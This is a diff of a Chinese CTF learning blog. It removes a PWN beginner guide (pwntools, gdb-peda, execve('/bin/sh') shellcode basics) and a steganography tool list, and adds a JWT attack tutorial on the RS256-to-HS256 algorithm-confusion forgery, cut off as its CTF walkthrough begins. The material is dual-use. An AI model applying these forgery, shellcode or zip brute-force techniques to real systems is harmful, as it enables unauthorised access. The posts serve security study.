@@ -64,115 +64,141 @@
     <header>
       
         <div class="icon"></div>
-        <time datetime="2019-11-07T16:09:51.288Z"><a href="/xikong-mubai.github.io/2019/11/08/汐白来学PWN-1/">2019-11-08</a></time>
+        <time datetime="2019-05-20T13:21:21.000Z"><a href="/xikong-mubai.github.io/2019/05/20/(json web token)JWT攻击/">2019-05-20</a></time>
       
       
   
-    <h1 class="title"><a href="/xikong-mubai.github.io/2019/11/08/汐白来学PWN-1/"></a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>@<a href="汐白初学PWN">TOC</a></p>
-<h1 id="工具的准备"><a href="#工具的准备" class="headerlink" title="工具的准备"></a>工具的准备</h1><h2 id="kali-Linux"><a href="#kali-Linux" class="headerlink" title="kali-Linux"></a>kali-Linux</h2><p>叭说了，kali这么好用为什么不用，Ubuntu16.04也行</p>
-<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwn必备python包，pip直接安装，python2的</p>
-<h2 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h2><p>很好用的一个Linux下gdb调试器的版本吧算是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/longld/peda.git ~/peda</span></span><br><span class="line">echo <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~<span class="regexp">/.gdbinit</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>另一个版本的用于Linux下程序调试的gdb，但是没用过，据说很强，推荐先用peda<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/pwndbg/pwndbg</span></span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p>
-<h2 id="odjdump"><a href="#odjdump" class="headerlink" title="odjdump"></a>odjdump</h2><p>转载：<br><a href="http://www.gpshk.cc/thread-52817-1-1.html" target="_blank" rel="noopener">odjdump的使用（Linux反汇编工具）</a><br>(出处: GPS导航技术社区)</p>
-<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>构建ROP的实用工具<br>项目地址:<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a><br>安装：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master http:<span class="comment">//github.com/JonathanSalwan/ROPgadget.git</span></span><br><span class="line">cd ROPgadget</span><br><span class="line">cd ./dependencies/capstone-next</span><br><span class="line">./make.sh</span><br><span class="line">sudo ./make.sh install</span><br><span class="line">cd ./bindings/python</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p>
-<h2 id="IDA-PRO"><a href="#IDA-PRO" class="headerlink" title="IDA PRO"></a>IDA PRO</h2><p>ida不用说了，经典软件，既有Windows的版本也有Linux的版本，不过一般推荐直接用windows下的，Linux似乎安装比较麻烦。<br><strong>64位Linux下安装教程：<a href="https://www.52pojie.cn/thread-542682-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-542682-1-1.html</a></strong></p>
-<h1 id="工具的简单使用"><a href="#工具的简单使用" class="headerlink" title="工具的简单使用"></a>工具的简单使用</h1><h2 id="pwntools简单使用"><a href="#pwntools简单使用" class="headerlink" title="pwntools简单使用"></a>pwntools简单使用</h2><p>虽然这个百度就可以，不过还是习惯性记录一下<br>终端中输入<code>python2</code>进入python命令状态<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *        #pwnrools包的使用方法</span><br><span class="line">io = remote('IP',port)   #这个是做pwn题时设定远程攻击的IP地址和端口</span><br><span class="line">io = process('name')     #这个是题目文件下载到本地进行测试自己的脚本是否成功获取权限时用的，name为文件名</span><br><span class="line">io.sendline(payload)     #向目标程序发送自己构造的payload</span><br><span class="line">io.recv()                #接收程序的输出</span><br><span class="line">io.interactive()         #如果成功获取shell权限通过该命令与目标机的shell进行互动</span><br><span class="line">#构建payload时</span><br><span class="line">payload=p64(***)         #对***使用64位系统的储存方式</span><br><span class="line">payload=p32(***)         #对***使用32位系统的储存方式</span><br></pre></td></tr></table></figure></p>
-<h2 id="ROPgadget使用"><a href="#ROPgadget使用" class="headerlink" title="ROPgadget使用"></a>ROPgadget使用</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary name --only '***' | grep '***'    #查询需要的汇编命令所在地址</span><br><span class="line">#按道理来说它是这样查命令的，不过查询有限制，一般后面***这里要这么输：'***|ret'|grep '***'  ***根据需要来写</span><br><span class="line">ROPgadget --binary name --string "***"               #查询需要的字符所在地址</span><br><span class="line">ROPgadget --binary name --only 'int'                 #查询'int 80'</span><br></pre></td></tr></table></figure>
-<h2 id="gdb-peda的简单命令介绍"><a href="#gdb-peda的简单命令介绍" class="headerlink" title="gdb-peda的简单命令介绍"></a>gdb-peda的简单命令介绍</h2><p>终端：<code>gdb</code>    打开gdb ;   <code>gdb  name</code>  用gdb调试器加载目标程序<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r/run                               #运行程序，或是在程序中途重新加载运行程序，类似 OD 里的 ctrl+F2</span><br><span class="line">ni                                  #直接运行该行命令，OD 的单步步过</span><br><span class="line">si                                  #进入该行命令内部，进入函数内部用，OD 单步步入</span><br><span class="line">file                                #加载目标程序</span><br><span class="line">find/searchmem                      #搜索目标字符</span><br><span class="line">c/continue                          #继续运行程序</span><br><span class="line">telescope address                   #查看目标内存地址信息</span><br><span class="line">info                                #查看各种信息：</span><br><span class="line">info file                           #查看当前文件的信息，例如程序入口点（Entry point）</span><br><span class="line">info break                          #查看当前断点信息</span><br><span class="line">disas name                          #查看目标函数的反汇编内容</span><br><span class="line">b/break name/address                #为目标函数或地址设置断点</span><br><span class="line">pattern_create   number             #生成一串number长度的字符，在测试溢出长度时挺方便的</span><br><span class="line">pattern_offset   溢出位置的字符      #返回输入入口距离溢出点的长度</span><br></pre></td></tr></table></figure></p>
-<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p><strong>pwn</strong>一般目的是为了获取目标机的<code>shell</code>权限，同时也可以是对目标机进行其他的攻击。而其攻击方式一般是通过程序自身的漏洞劫持eip，然后按照攻击者的需要使其执行相应的系统命令。<br>获取shell权限一般是控制程序运行出<code>execve(&quot;/bin/sh&quot;,0,0)</code>函数或者说<code>system(“/bin/sh”)</code>函数，从而拿到<code>shell</code><br>因为程序已经是被编译生成的可执行程序，所以我们要做的就是让其在运行时按照<code>execve(&quot;/bin/sh&quot;,0,0)</code>或<code>system(“/bin/sh”)</code>函数的需要依次序执行相应的命令使其在没有该函数的情况下实现该函数的作用。<br>为了实现这一目的而向目标程序发送的数据一般称为<code>shellcode</code>或者说<strong>payload</strong></p>
-<h2 id="Linux-i386处理器系统的简单shellcode原理"><a href="#Linux-i386处理器系统的简单shellcode原理" class="headerlink" title="Linux-i386处理器系统的简单shellcode原理"></a>Linux-i386处理器系统的简单shellcode原理</h2><p>32位系统要执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>时，可用以下汇编代码简单说明<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb      #execve()函数的系统调用号为0xb，将其放入eax</span><br><span class="line">mov ebx,address  #address为字符"/bin/sh"的地址，ebx为所要调用的execve函数的第一个参数，即"/bin/sh"</span><br><span class="line">mov ecx,0        #第二个参数0</span><br><span class="line">mov edx,0        #第三个参数0</span><br><span class="line">int 80h          #呼叫系统调用，运行该指令后会根据**eax**中的值判断系统调用的结果</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 80h  #该指令并非和其他指令配套的指令，它的功能就是中断程序运行去进行系统调用，而系统调用的结果由`eax`中的值决定</span><br></pre></td></tr></table></figure>
-<p>Linux-i386下的系统调用号查看：<a href="http://asm.sourceforge.net/syscall.html#p3" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#p3</a></p>
-<h2 id="Linux-amd64系统的简单shellcode原理"><a href="#Linux-amd64系统的简单shellcode原理" class="headerlink" title="Linux-amd64系统的简单shellcode原理"></a>Linux-amd64系统的简单shellcode原理</h2><p>原理和32位系统基本一样，不过不一样的是64位系统毕竟与32位有很大区别，他们的传参方法和进行系统调用时的方式都不同。<br>64位Linux系统的参数首先被放在edi，esi，edx，ecx，r8，r9六个寄存器中，多余的参数才放入堆栈<br>所并且其系统调用命令为<code>syscall</code>而非是<code>int 80h</code><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov edi,<span class="number">0x3b</span></span><br><span class="line">mov esi，address</span><br><span class="line">mov edx，<span class="number">0</span></span><br><span class="line">mov ecx，<span class="number">0</span></span><br><span class="line">syscall     #Linux-amd64系统的系统调用命令，这里和int 80h应该是不一样的，具体不清楚</span><br></pre></td></tr></table></figure></p>
-<h2 id="如何查看系统调用号"><a href="#如何查看系统调用号" class="headerlink" title="如何查看系统调用号"></a>如何查看系统调用号</h2><p>通过本地文件看：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">locate unistd_32  #查询Linux-i386系统调用号参数表的位置</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">locate unistd_64  #查询Linux-amd64系统调用号参数表的位置</span><br></pre></td></tr></table></figure></p>
-<p>然后直接<code>cat</code></p>
-<h2 id="著名的shell-storm-org的ShellCode数据库"><a href="#著名的shell-storm-org的ShellCode数据库" class="headerlink" title="著名的shell-storm.org的ShellCode数据库"></a>著名的shell-storm.org的ShellCode数据库</h2><p>地址：shell-storm.org/shellcode/<br>里面有各种类型的shellcode，简单情况可以直接在里面找合适的shellcode来用，特殊情况需要自行对shellcode进行改造</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2019-06-12T13:21:21.000Z"><a href="/xikong-mubai.github.io/2019/06/12/隐写术 - 有用工具和资源的列表/">2019-06-12</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/xikong-mubai.github.io/2019/06/12/隐写术 - 有用工具和资源的列表/">隐写术</a></h1>
+    <h1 class="title"><a href="/xikong-mubai.github.io/2019/05/20/(json web token)JWT攻击/">json web token 攻击</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <p> 隐写术将文件或消息隐藏在另一个文件中，有许多有趣的隐写CTF挑战，其中标志隐藏在图像，音频文件甚至其他类型的文件中。这是我使用的大多数工具和一些其他有用资源的列表。<br>注意：此列表将定期更新，如果您有任何建议，请随时到下午</p>
-<h2 id="最后更新：29-1-2019"><a href="#最后更新：29-1-2019" class="headerlink" title="最后更新：29.1.2019"></a>最后更新：29.1.2019</h2><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><hr>
-<h2 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h2><p>Steghide是一个隐藏数据的程序，可以隐藏各种图像和音频文件中的数据，只支持这些文件格式：JPEG, BMP, WAV and AU。但它对从其他文件中提取嵌入和加密数据也很有用。它可以安装<code>apt</code>并且<a href="https://github.com/StefanoDeVuono/steghide" target="_blank" rel="noopener">源</a>可以在github上找到。</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide info file :显示有关文件是否包含嵌入数据的信息。</span><br><span class="line">steghide extract -sf file :从文件中提取嵌入数据</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Foremost"><a href="#Foremost" class="headerlink" title="Foremost"></a>Foremost</h2><p>Foremost是一个程序，它根据页眉，页脚和内部数据结构恢复文件，我发现它在处理png图像时很有用。<br>它可以安装<code>apt</code>并且<a href="https://github.com/korczis/foremost" target="_blank" rel="noopener">源</a>可以在github上找到。</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i file ：从给定文件中提取数据。</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>有时在图像本身中隐藏着一条消息或文本，为了查看它，您需要应用一些颜色过滤器或使用颜色级别。您可以使用GIMP或Photoshop或任何其他图像编辑软件，但stegsolve使它更容易。它是一个小型的java工具，可以在图像上应用许多颜色过滤器。我个人认为它非常有用。你可以从<a href="https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve" target="_blank" rel="noopener">github</a>得到它</p>
-<hr>
-<h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>Strings是一个linux工具，可以在文件中显示可打印的字符串。在解决隐秘挑战时，这个简单的工具非常有用。通常，嵌入数据受密码保护或加密，有时密码是文件本身的密码，可以通过使用字符串轻松查看<br>这是一个默认的linux工具，所以你不需要安装任何东西。</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings file ：在给定文件中显示可打印的字符串。</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Exiftool"><a href="#Exiftool" class="headerlink" title="Exiftool"></a>Exiftool</h2><p>有时重要的东西隐藏在图像或文件的元数据中，exiftool可以非常有助于查看文件的元数据。<br>你可以从<a href="https://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="noopener">这里</a>得到它</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool file ：显示给定文件的元数据</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Exiv2"><a href="#Exiv2" class="headerlink" title="Exiv2"></a>Exiv2</h2><p>一种类似于exiftool的工具。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/Exiv2/exiv2" target="_blank" rel="noopener">exiv2</a>可以在github上找到。<br><a href="http://www.exiv2.org/" target="_blank" rel="noopener">官方网站</a></p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiv2 file ：显示给定文件的元数据</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>Binwalk是一种用于搜索嵌入式文件和数据的图像和音频文件等二进制文件的工具。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/ReFirmLabs/binwalk" target="_blank" rel="noopener">源</a>可以在github上找到。</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk file ：显示给定文件中的嵌入数据</span><br><span class="line">binwalk -e file ：显示和提取给定文件中的数据</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Zsteg"><a href="#Zsteg" class="headerlink" title="Zsteg"></a>Zsteg</h2><p>zsteg是一个可以检测png和bmp文件中隐藏数据的工具。<br>安装它：gem install zsteg，源可以在<a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="noopener">github</a>上找到</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a file ：运行给定文件上的所有方法</span><br><span class="line">zsteg -E file ：从给定的有效负载中提取数据（例如：zsteg -E b4，bgr，msb，xy name.png）</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Wavsteg"><a href="#Wavsteg" class="headerlink" title="Wavsteg"></a>Wavsteg</h2><p>WavSteg是一个python3工具，可以隐藏wav文件中的数据和文件，也可以从wav文件中提取数据。<br>你可以从<a href="https://github.com/ragibson/Steganography#WavSteg" target="_blank" rel="noopener">github</a>得到它</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WavSteg.py -r -s soundfile -o outputfile ：从wav声音文件中提取数据并将数据输出到新文件中</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="Sonic-visualizer"><a href="#Sonic-visualizer" class="headerlink" title="Sonic visualizer"></a>Sonic visualizer</h2><p>Sonic visualizer声波可视化工具是一种用于查看和分析音频文件内容的工具，但在处理音频隐写时它会很有用。您可以在音频文件中显示隐藏的形状。<br><a href="https://www.sonicvisualiser.org/" target="_blank" rel="noopener">官方网站</a></p>
-<hr>
-<h2 id="Bruteforcers"><a href="#Bruteforcers" class="headerlink" title="Bruteforcers"></a>Bruteforcers</h2><h2 id="StegCracker"><a href="#StegCracker" class="headerlink" title="StegCracker"></a><a href="https://github.com/Paradoxis/StegCracker" target="_blank" rel="noopener">StegCracker</a></h2><p>使用steghide强制密码的工具</p>
-<hr>
-<h2 id="Fcrackzip"><a href="#Fcrackzip" class="headerlink" title="Fcrackzip"></a>Fcrackzip</h2><p>有时提取的数据是受密码保护的zip，此工具强制执行zip存档。<br>它可以安装，<code>apt</code>并且<a href="https://github.com/hyc/fcrackzip" target="_blank" rel="noopener">源</a>可以在github上找到。</p>
-<p>有用的命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p wordlist.txt file.zip ：使用给定wordlist中的密码强制给定zip文件</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><h2 id="Unicode文本隐写术"><a href="#Unicode文本隐写术" class="headerlink" title="Unicode文本隐写术"></a><a href="https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder" target="_blank" rel="noopener">Unicode文本隐写术</a></h2><p>一个用于unicode隐写术的网络工具，它可以编码和解码文本</p>
-<hr>
-<h2 id="npiet在线"><a href="#npiet在线" class="headerlink" title="npiet在线"></a><a href="https://www.bertnase.de/npiet/npiet-execute.php" target="_blank" rel="noopener">npiet在线</a></h2><p>piet的在线翻译。piet是一种深奥的语言，piet中的程序是图像。阅读更多关于piet的<a href="http://www.dangermouse.net/esoteric/piet.html" target="_blank" rel="noopener">信息</a></p>
-<hr>
-<h2 id="dcode-fr"><a href="#dcode-fr" class="headerlink" title="dcode.fr"></a><a href="https://www.dcode.fr/" target="_blank" rel="noopener">dcode.fr</a></h2><p>有时在解决隐写术挑战时，您需要解码一些文本。dcode.fr有很多解码器，可以提供很多密码，非常有用。</p>
-<hr>
-<h1 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h1><p>一些隐写挑战平台<br><a href="https://www.hackthebox.eu/" target="_blank" rel="noopener">Hack The Box</a><br><a href="https://www.root-me.org/" target="_blank" rel="noopener">root me</a><br><a href="https://ringzer0ctf.com/challenges" target="_blank" rel="noopener">RingerZeroCTF</a></p>
-<p>转载自：<a href="https://0xrick.github.io/lists/stego/" target="_blank" rel="noopener">https://0xrick.github.io/lists/stego/</a></p>
+        <p>前记<br>最近国赛+校赛遇到两次json web token的题，发现自己做的并不算顺畅，于是有了这篇学习文章。</p>
+<p>为什么要使用Json Web Token<br>Json Web Token简称jwt</p>
+<p>顾名思义，可以知道是用于身份认证的</p>
+<p>那么为什么要有身份认证？</p>
+<p>我们知道HTTP是无状态的，打个比方：</p>
+<p>有状态：</p>
+<p>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：还不错，挺好吃的。</p>
+<p>无状态：</p>
+<p>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：？？？啊？啥？啥味道怎么样？</p>
+<p>那么怎么样可以让HTTP记住曾经发生的事情呢？</p>
+<p>这里的选择可以很多：cookie,session,jwt</p>
+<p>对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造，这肯定不是我们期望的。</p>
+<p>那么对于session呢？</p>
+<p>对于session:客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，例如phpsessid，再次发起请求的时候，携带cookie中的sessionID到服务端，服务端会缓存该session（会话），当客户端请求到来的时候，服务端就知道是哪个用户的请求，并将处理的结果返回给客户端，完成通信。</p>
+<p>但是这样的机制会存在一些问题：</p>
+<p>1、session保存在服务端，当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验；</p>
+<p>2、当服务端为集群时，用户登陆其中一台服务器，会将session保存到该服务器的内存中，但是当用户的访问到其他服务器时，会无法访问，通常采用缓存一致性技术来保证可以共享，或者采用第三方缓存来保存session，不方便。</p>
+<p>所以这个时候就需要jwt了</p>
+<p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在本地（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
+<p>无论何时用户想要访问受保护的路由或资源，用户代理都应使用承载方案发送JWT，通常在授权header中。header的内容应该如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这是一种无状态身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器受保护的路由将在授权头中检查有效的JWT，如果存在，则允许用户访问受保护的资源。由于JWT是独立的，所有必要的信息都在那里，减少了多次查询数据库的需求。</p>
+<p>这使我们可以完全依赖无状态的数据API，无论哪些域正在为API提供服务，因此跨源资源共享（CORS）不会成为问题，因为它不使用Cookie。</p>
+<p>Json Web Token结构<br>那么一般jwt长什么样子呢？</p>
+<p>我们随便挑一个看看：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-<span class="number">0</span>TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure></p>
+<p>不妨解密一下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"RS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;&#123;<span class="string">"name"</span>:<span class="string">"adminsky"</span>,<span class="string">"priv"</span>:<span class="string">"other"</span>&#125;乱码</span><br></pre></td></tr></table></figure></p>
+<p>不难看出，jwt解码后分为3个部分，由三个点（.）分隔</p>
+<p>分别为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Header</span><br><span class="line">Payload</span><br><span class="line">Signature</span><br></pre></td></tr></table></figure></p>
+<p>Header<br>通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。</p>
+<p>正如json所显示<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"RS256"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>alg为算法的缩写，typ为类型的缩写</p>
+<p>然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。</p>
+<p>Payload<br>令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。</p>
+<p>这里是用户随意定义的数据</p>
+<p>例如上面的举例<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"adminsky"</span>,</span><br><span class="line">    <span class="string">"priv"</span>:<span class="string">"other"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。</p>
+<p>但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。</p>
+<p>Signature<br>要创建签名部分，必须采用header，payload，密钥</p>
+<p>然后利用header中指定算法进行签名</p>
+<p>例如HS256(HMAC SHA256),签名的构成为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64Encode(header) + <span class="string">"."</span> +</span><br><span class="line">  base64Encode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure></p>
+<p>然后将这部分base64编码形成JSON Web Token第三部分</p>
+<p>Json Web Token攻击手段<br>既然JWT作为一种身份验证的手段，那么必然存在伪造身份的恶意攻击，那么我们下面探讨一下常见的JWT攻击手段</p>
+<p>算法修改攻击<br>我们知道JWT的header部分中，有签名算法标识alg</p>
+<p>而alg是用于签名算法的选择，最后保证用户的数据不被篡改。</p>
+<p>但是在数据处理不正确的情况下，可能存在alg的恶意篡改</p>
+<p>例如由于网站的不严谨，我们拿到了泄露的公钥pubkey</p>
+<p>我们知道如果签名算法为RS256，那么会选择用私钥进行签名，用公钥进行解密验证</p>
+<p>假设我们只拿到了公钥，且公钥模数极大，不可被分解，那么如何进行攻击呢？</p>
+<p>没有私钥我们是几乎不可能在RS256的情况下篡改数据的，因为第三部分签名需要私钥，所以我们可以尝试将RS256改为HS256</p>
+<p>此时即非对称密码变为对称加密</p>
+<p>我们知道非对称密码存在公私钥问题</p>
+<p>而对称加密只有一个key</p>
+<p>此时如果以pubkey作为key对数据进行篡改，则会非常简单，而如果后端的验证也是根据header的alg选择算法，那么显然正中下怀。</p>
+<p>下面以一道实战为例进行说明：</p>
+<p>拿到题目<br><a href="http://pastebin.bxsteam.xyz" target="_blank" rel="noopener">http://pastebin.bxsteam.xyz</a></p>
+<p>一开始不知道是要做什么，所以先查看源码</p>
+<p>发现<br><a href="http://pastebin.bxsteam.xyz/static/js/common.js" target="_blank" rel="noopener">http://pastebin.bxsteam.xyz/static/js/common.js</a></p>
+<p>其中几个点引人注目</p>
+<p>关注点1：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth = <span class="string">"Bearer "</span> + token;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/list'</span>,</span><br><span class="line">    type: <span class="string">'GET'</span>,</span><br><span class="line">    headers:&#123;<span class="string">"Authorization"</span>:auth&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>存在web token</p>
